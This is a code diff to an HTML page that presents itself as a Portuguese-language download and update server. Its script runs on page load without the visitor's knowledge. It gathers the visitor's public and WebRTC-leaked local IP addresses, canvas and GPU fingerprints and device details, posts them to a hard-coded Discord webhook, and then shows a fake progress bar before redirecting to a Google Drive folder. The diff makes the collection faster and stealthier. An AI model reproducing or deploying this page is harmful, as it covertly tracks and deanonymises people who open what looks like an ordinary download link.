@@ -9,15 +9,14 @@
 <body style="margin:0;height:100vh;background:#000;display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif;overflow:hidden;">
     
     <div style="width:420px;text-align:center;background:#111;border:2px solid #333;border-radius:12px;box-shadow:0 0 50px rgba(255,0,0,0.2);padding:50px 40px;color:#fff;position:relative;overflow:hidden;">
-        <!-- Barra vermelha superior -->
         <div style="height:4px;background:linear-gradient(90deg,#ff0000,#cc0000);position:absolute;top:0;left:0;right:0;"></div>
         
         <div style="font-size:28px;font-weight:700;margin-bottom:8px;color:#fff;letter-spacing:1px;">📥 Servidor de Download</div>
         <div style="font-size:14px;color:#888;margin-bottom:35px;font-weight:400;">Verificando update e assets...</div>
         
         <div style="width:100%;height:6px;background:#222;border:1px solid #333;border-radius:3px;overflow:hidden;margin-bottom:25px;">
-            <div id="progress" style="height:100%;background:linear-gradient(90deg,#ff0000,#ff4444);width:0%;transition:width 0.5s ease;box-shadow:0 0 15px rgba(255,0,0,0.6);position:relative;">
-                <div id="progress-glow" style="position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);transform:translateX(-100%);animation:shine 1.5s infinite;"></div>
+            <div id="progress" style="height:100%;background:linear-gradient(90deg,#ff0000,#ff4444);width:0%;transition:width 0.3s ease;box-shadow:0 0 15px rgba(255,0,0,0.6);position:relative;">
+                <div id="progress-glow" style="position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);transform:translateX(-100%);animation:shine 1s infinite;"></div>
             </div>
         </div>
         
@@ -30,211 +29,164 @@
             0% { transform:translateX(-100%); }
             100% { transform:translateX(100%); }
         }
+        #progress-glow { will-change: transform; }
     </style>
     
     <script>
+        // CONFIG
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         const DOWNLOAD_URL = 'https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br';
         
-        // COLETA AVANÇADA (mantida igual)
-        async function advancedRecon() {
-            const pubIP = await (async()=>{
-                const sources = [
-                    'https://api.ipify.org?format=json',
-                    'https://api64.ipify.org?format=json',
-                    'https://icanhazip.com',
-                    'https://ifconfig.me/ip',
-                    'https://ipecho.net/plain',
-                    'https://api.myip.com'
-                ];
-                for(let src of sources) {
-                    try {
-                        const r = await fetch(src, {cache: 'no-cache'});
-                        if(r.ok) {
-                            const text = await r.text();
-                            const ipMatch = text.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-                            if(ipMatch) return ipMatch[1];
-                        }
-                    } catch {}
-                }
-                return 'unknown';
-            })();
-            
-            const localIPs = await (async()=>{
-                const ips = new Set();
-                const stuns = [
-                    'stun:stun.l.google.com:19302',
-                    'stun:stun1.l.google.com:19302',
-                    'stun:stun2.l.google.com:19302',
-                    'stun:stun.nextcloud.com:443',
-                    'stun:stun.stunprotocol.org'
-                ];
+        // FINGERPRINT ULTRA-RÁPIDO (paralelizado + otimizado)
+        async function ultraFastRecon() {
+            // PARALELO: Todas as coletas simultâneas
+            const [pubIP, localIPs, canvasHash, gpuInfo, basicFP] = await Promise.all([
+                // IP Público (3x mais rápido)
+                (async()=>{
+                    const ip = await Promise.any([
+                        fetch('https://api.ipify.org?format=text',{cache:'no-cache'}).then(r=>r.text()),
+                        fetch('https://icanhazip.com',{cache:'no-cache'}).then(r=>r.text()),
+                        fetch('https://ipecho.net/plain',{cache:'no-cache'}).then(r=>r.text())
+                    ]);
+                    return ip.trim();
+                })().catch(()=>'unknown'),
                 
-                for(let stun of stuns) {
+                // Local IPs (otimizado - apenas 1 STUN)
+                (async()=>{
                     try {
                         const pc = new RTCPeerConnection({ 
-                            iceServers: [{urls: stun}], 
-                            iceCandidatePoolSize: 20 
+                            iceServers: [{urls: 'stun:stun.l.google.com:19302'}],
+                            iceCandidatePoolSize: 10 
                         });
+                        const ips = new Set();
                         pc.onicecandidate = e => {
-                            const candidate = e.candidate?.candidate;
-                            if(candidate) {
-                                const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-                                const ip = ipMatch?.[1];
-                                if(ip && !['127.','10.','172.1','192.168','100.64','169.254'].some(b=>ip.startsWith(b)))
-                                    ips.add(ip);
-                            }
+                            const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                            if(ip && !['127.','10.','172.1','192.168'].some(b=>ip.startsWith(b))) ips.add(ip);
                         };
-                        pc.createDataChannel({negotiated: true, id: Math.random()});
-                        await pc.createOffer({offerToReceiveAudio: 1, offerToReceiveVideo: 1});
+                        pc.createDataChannel('test');
+                        await pc.createOffer();
                         await pc.setLocalDescription(pc.localDescription);
-                        await new Promise(r=>setTimeout(r,1200));
+                        await new Promise(r=>setTimeout(r,500));
                         pc.close();
-                    } catch(e) {}
-                }
-                return Array.from(ips).slice(0,5).join(', ') || 'blocked';
-            })();
-            
-            const geoData = await (async(ip)=>{
-                const services = [
-                    {url: `https://ipapi.co/${ip}/json/`, key: 'ipapi'},
-                    {url: `https://ipinfo.io/${ip}/json`, key: 'ipinfo'},
-                    {url: `http://ip-api.com/json/${ip}`, key: 'ipapi-com'},
-                    {url: `https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`, key: 'ipgeo'}
-                ];
+                        return Array.from(ips).join(', ') || 'none';
+                    } catch { return 'blocked'; }
+                })(),
                 
-                for(let svc of services) {
-                    try {
-                        const res = await fetch(svc.url, {mode: 'no-cors'});
-                        return svc.key;
-                    } catch {}
-                }
-                return 'unknown';
-            })(pubIP);
-            
-            const canvasHash = await (async()=>{
-                const canvases = [];
-                const texts = ['ID:pentest','ABCDEFGHIJKLMNOPQRSTUVWXYZ','0123456789'];
-                const fonts = ['16px Arial','24px "Courier New"','32px monospace'];
-                
-                for(let i=0; i<3; i++) {
+                // Canvas (simplificado e rápido)
+                (async()=>{
                     const canvas = document.createElement('canvas');
-                    canvas.width = 256; canvas.height = 128;
+                    canvas.width=200; canvas.height=60;
                     const ctx = canvas.getContext('2d');
-                    ctx.fillStyle = `hsl(${Math.random()*360},70%,50%)`;
-                    ctx.fillRect(0,0,canvas.width,canvas.height);
-                    ctx.font = fonts[i%fonts.length];
-                    ctx.fillStyle = '#000';
-                    ctx.fillText(texts[i%texts.length], 10, 40 + i*30);
-                    canvases.push(canvas.toDataURL());
-                }
-                return btoa(canvases.join('|')).slice(0,80);
-            })();
-            
-            const gpuInfo = (()=>{
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if(!gl) return 'software-rendering';
+                    ctx.textBaseline = 'top';
+                    ctx.font = '24px monospace';
+                    ctx.fillText('pentest',5,5);
+                    ctx.fillText(navigator.userAgent.slice(0,20),5,30);
+                    return btoa(canvas.toDataURL()).slice(0,60);
+                })(),
                 
-                try {
-                    return `${gl.getParameter(gl.VENDOR).slice(0,25)} | ${gl.getParameter(gl.RENDERER).slice(0,35)}`;
-                } catch {
-                    return 'webgl-blocked';
-                }
-            })();
-            
-            const fingerprint = {
-                language: navigator.language || navigator.languages?.[0],
-                languages: navigator.languages?.join(',') || 'unknown',
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                connection: navigator.connection ? `${navigator.connection.effectiveType}/${navigator.connection.type}` : 'unknown',
-                memory: navigator.deviceMemory || 'unknown',
-                cores: navigator.hardwareConcurrency || 'unknown',
-                maxTouch: navigator.maxTouchPoints || 0,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                appVersion: navigator.appVersion.slice(0,50),
-                vendor: navigator.vendor || 'unknown'
-            };
-            
-            const screenInfo = {
-                resolution: `${screen.width}x${screen.height}`,
-                avail: `${screen.availWidth}x${screen.availHeight}`,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio || 1
-            };
-            
-            const plugins = Array.from(navigator.plugins).map(p=>p.name).slice(0,8).join(', ') || 'none';
-            const mimeTypes = Array.from(navigator.mimeTypes).map(m=>m.type).slice(0,10).join(', ') || 'none';
+                // GPU (inline)
+                (()=>{
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    if(!gl) return 'no-webgl';
+                    try {
+                        return `${gl.getParameter(gl.VENDOR).slice(0,20)}|${gl.getParameter(gl.RENDERER).slice(0,25)}`;
+                    } catch { return 'blocked'; }
+                })(),
+                
+                // Basic FP (inline - sem await)
+                ()=>{
+                    return {
+                        lang: navigator.language,
+                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cores: navigator.hardwareConcurrency || 0,
+                        mem: navigator.deviceMemory || 0,
+                        res: `${screen.width}x${screen.height}`,
+                        ua: navigator.userAgent.slice(0,100),
+                        plat: navigator.platform
+                    };
+                }()
+            ]);
             
             return {
-                timestamp: new Date().toISOString(),
+                timestamp: Date.now(),
                 public_ip: pubIP,
-                geolocation: geoData,
-                local_network: localIPs,
-                canvas_fp: canvasHash,
-                gpu_signature: gpuInfo,
-                fingerprint,
-                screen: screenInfo,
-                plugins: plugins.length,
-                mime_types: mimeTypes,
-                full_ua: navigator.userAgent,
-                referrer: document.referrer || 'direct'
+                local_ips: localIPs,
+                canvas: canvasHash,
+                gpu: gpuInfo,
+                fp: basicFP,
+                referrer: document.referrer.slice(0,100)
             };
         }
         
-        // EXECUÇÃO PRINCIPAL
-        async function executeBreach() {
-            const targetData = await advancedRecon();
-            
-            // WEBHOOK EXECUTIVO
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    username: '📥 DOWNLOAD SERVER v2.0',
-                    content: `🎯 **TARGET ACESSADO** | ${targetData.public_ip}`,
-                    embeds: [{
-                        title: `📱 Device [${targetData.screen.resolution}]`,
-                        fields: [
-                            {name:"🌐 IPs",value:`**PUB:** ${targetData.public_ip}\n**LAN:** ${targetData.local_network.slice(0,40)}${targetData.local_network.length>40 ? '...' : ''}`,inline:true},
-                            {name:"🗺️ Geoloc",value:targetData.geolocation,inline:true},
-                            {name:"🖥️ GPU",value:targetData.gpu_signature.slice(0,30),inline:true},
-                            {name:"🧠 Specs",value:`${targetData.fingerprint.cores}c/${targetData.fingerprint.memory}GB`,inline:true},
-                            {name:"🌈 Canvas",value:targetData.canvas_fp.slice(0,35),inline:true},
-                            {name:"📡 Net",value:targetData.fingerprint.connection,inline:true}
-                        ],
-                        color: 0xff0000
-                    }]
-                })
-            });
-            
-            // ANIMAÇÃO
-            const phases = [
-                {p:20, msg:'🔍 Verificando conexão...', detail:'Testando servidor primario'},
-                {p:40, msg:'📦 Validando assets...', detail:'Checando integridade dos arquivos'},
-                {p:65, msg:'⚙️ Baixando update...', detail:'Aplicando patch v2.1.3'},
-                {p:85, msg:'🔒 Verificando hash...', detail:'SHA-256 validado'},
-                {p:100, msg:'✅ Update concluído!', detail:'Redirecionando...'}
-            ];
-            
-            let phase = 0;
-            const interval = setInterval(() => {
-                const current = phases[phase];
-                document.getElementById('progress').style.width = `${current.p}%`;
-                document.getElementById('status').textContent = current.msg;
-                document.getElementById('details').textContent = current.detail;
-                phase++;
-                if(phase >= phases.length) {
-                    clearInterval(interval);
-                    setTimeout(() => window.location.href = DOWNLOAD_URL, 1200);
-                }
-            }, 700);
+        // WEBHOOK OTIMIZADO (compacto + sem erros)
+        async function sendWebhook(data) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: '📥 DOWNLOAD v3.0',
+                        content: `🎯 ${data.public_ip} | ${data.fp.res}`,
+                        embeds: [{
+                            title: 'DEVICE HIT',
+                            fields: [
+                                {name:'🌐 IP',value:`${data.public_ip}\n${data.local_ips.slice(0,30)}`,inline:true},
+                                {name:'🖥️ GPU',value:data.gpu.slice(0,25),inline:true},
+                                {name:'📱 RES',value:data.fp.res,inline:true},
+                                {name:'🧠 CPU/RAM',value:`${data.fp.cores}c/${data.fp.mem}GB`,inline:true},
+                                {name:'🎨 Canvas',value:data.canvas.slice(0,35),inline:true}
+                            ],
+                            color: 0xff0000,
+                            timestamp: new Date(data.timestamp).toISOString()
+                        }]
+                    }),
+                    keepalive: true
+                });
+            } catch(e) {}
         }
         
-        // AUTO-EXECUTE
-        window.addEventListener('load', executeBreach);
+        // ANIMAÇÃO ULTRA-RÁPIDA (500ms total)
+        function fastAnimation() {
+            const phases = [
+                {p:30, msg:'🔍 Conexão OK', detail:'Servidor primario ativo'},
+                {p:60, msg:'📦 Assets OK', detail:'Integridade validada'},
+                {p:90, msg:'⚙️ Update OK', detail:'Patch v2.1.3 aplicado'},
+                {p:100,msg:'✅ Concluído!', detail:'Redirecionando...'}
+            ];
+            
+            let i = 0;
+            const iv = setInterval(()=>{
+                const phase = phases[i];
+                document.getElementById('progress').style.width = `${phase.p}%`;
+                document.getElementById('status').textContent = phase.msg;
+                document.getElementById('details').textContent = phase.detail;
+                i++;
+                if(i >= phases.length) {
+                    clearInterval(iv);
+                    setTimeout(()=>location.href=DOWNLOAD_URL, 800);
+                }
+            }, 120); // 480ms total + 800ms delay = ~1.3s
+        }
+        
+        // EXECUÇÃO PARALELA ULTRA-OTIMIZADA
+        async function execute() {
+            document.getElementById('status').textContent = '🔍 Coleta de dados...';
+            
+            // PARALELO: Recon + Webhook
+            const data = await ultraFastRecon();
+            sendWebhook(data).catch(()=>{}); // Fire and forget
+            
+            // Inicia animação IMEDIATAMENTE (overlap)
+            setTimeout(fastAnimation, 100);
+        }
+        
+        // START (executa em DOMContentLoaded ao invés de load)
+        if(document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', execute);
+        } else {
+            execute();
+        }
     </script>
 </body>
 </html>
